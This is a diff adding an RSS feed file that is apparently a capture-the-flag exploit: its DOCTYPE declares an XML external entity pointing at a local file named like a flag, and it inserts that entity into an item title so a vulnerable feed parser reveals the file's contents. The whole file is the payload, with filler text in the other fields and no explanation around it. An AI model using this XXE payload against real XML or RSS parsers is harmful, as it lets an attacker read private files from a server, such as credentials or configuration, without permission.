@@ -1,0 +1,24 @@
+<?xml version="1.0"?>
+<!DOCTYPE rss [
+  <!ELEMENT rss ANY>
+  <!ENTITY data SYSTEM "file:///flag_f585988a1516ea69928a8ca816184b10">
+]>
+<rss>
+    <channel>
+        <item>
+            <title>
+               &data;
+               title
+            </title>
+            <link>
+                hello
+            </link>
+            <description>
+                lol
+            </description>
+            <pubDate>
+                pubdate
+            </pubDate>
+        </item>
+    </channel>
+</rss>
